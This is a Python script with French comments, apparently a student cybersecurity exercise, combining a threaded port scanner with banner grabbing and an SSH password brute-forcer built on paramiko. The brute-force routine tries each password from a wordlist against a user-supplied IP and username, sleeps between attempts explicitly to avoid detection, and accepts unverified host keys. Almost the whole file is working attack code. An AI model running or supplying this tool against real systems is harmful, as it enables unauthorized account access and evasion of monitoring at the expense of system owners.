import socket
import threading
import time
import paramiko

# Verrou pour éviter les écritures concurrentes
lock = threading.Lock()

# Fonction 1 : Scanner les ports et récupérer les bannières
def grab_banner(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)

        result = sock.connect_ex((host, port))

        if result == 0:
            try:
                banner = sock.recv(1024).decode().strip()
            except socket.timeout:
                banner = "Aucune bannière détectée"
            except UnicodeDecodeError:
                banner = "Bannière non lisible"

            message = f"[+] Port {port} ouvert – Service détecté : {banner}"
            print(message)

            with lock:
                with open(r"C:\Users\Ruvik\Documents\GitHub\CYBERSEC-DORANCO\EXO-3\dataNetwork.txt", "a") as f:
                    f.write(message + "\n")

        sock.close()
    except Exception as e:
        print(f"[-] Erreur sur le port {port}: {e}")

# Fonction 2 : Charger une wordlist
def load_wordlist(filename):
    try:
        with open(filename, "r", encoding="utf-8") as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[-] Erreur : Le fichier {filename} n'existe pas.")
        return []

# Fonction 3 : Tester des mots de passe en SSH avec paramiko
def test_passwords(target, username, wordlist):
    print(f"[***] Test de mots de passe sur {target} avec l'utilisateur {username} [***]\n")

    for password in wordlist:
        print(f"[*] Test du mot de passe : {password}")

        success = ssh_auth(target, username, password)  # Utilisation de l'authentification SSH réelle
        
        if success:
            print(f"[+] Mot de passe trouvé : {password} 🔥")
            return password  # Arrête dès qu'on trouve un mot de passe valide

        time.sleep(0.5)  # Ajoute un délai pour éviter la détection

    print("[-] Aucun mot de passe trouvé.")
    return None

# Fonction qui tente l'authentification SSH réelle avec paramiko
def ssh_auth(target, username, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Accepte les clés non vérifiées

    try:
        # Tentative de connexion avec SSH
        ssh_client.connect(target, username=username, password=password, timeout=5)
        ssh_client.close()
        return True
    except paramiko.AuthenticationException:
        # Erreur d'authentification
        return False
    except (paramiko.SSHException, socket.error) as e:
        # Autres erreurs de SSH ou réseau
        print(f"[-] Erreur de connexion SSH : {e}")
        return False
    except Exception as e:
        # Gestion de toute autre exception
        print(f"[-] Erreur inattendue : {e}")
        return False

# Fonction principale du scanner
def start_scan():
    target = input("Entrer l'IP cible : ")
    start_port = int(input("Port de début : "))
    end_port = int(input("Port de fin : "))

    print(f"\n[***] Scan de {target} de {start_port} à {end_port} [***]\n")

    with open("dataNetwork.txt", "a") as f:
        f.write(f"\n[***] Scan de {target} de {start_port} à {end_port} [***]\n")

    threads = []

    for port in range(start_port, end_port + 1):
        t = threading.Thread(target=grab_banner, args=(target, port))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# Fonction principale de l'attaque
def start_attack():
    wordlist_file = "wordslist.txt"
    wordlist = load_wordlist(wordlist_file)

    if not wordlist:
        return

    # Demande de l'utilisateur pour le nom d'utilisateur
    username = input("Entrer le nom d'utilisateur : ")

    target = input("Entrer l'IP cible : ")

    test_passwords(target, username, wordlist)

# Menu principal
def main():
    while True:
        print("\n=== Menu Principal ===")
        print("1. Scanner les ports et récupérer les bannières")
        print("2. Attaquer un service avec une wordlist (Bruteforce)")
        print("3. Quitter")
        
        choice = input("Choisissez une option (1/2/3) : ")

        if choice == "1":
            start_scan()
        elif choice == "2":
            start_attack()
        elif choice == "3":
            print("Bye ! 👋")
            break
        else:
            print("Option invalide. Réessayez.")

# Lancer le menu principal
if __name__ == "__main__":
    main()
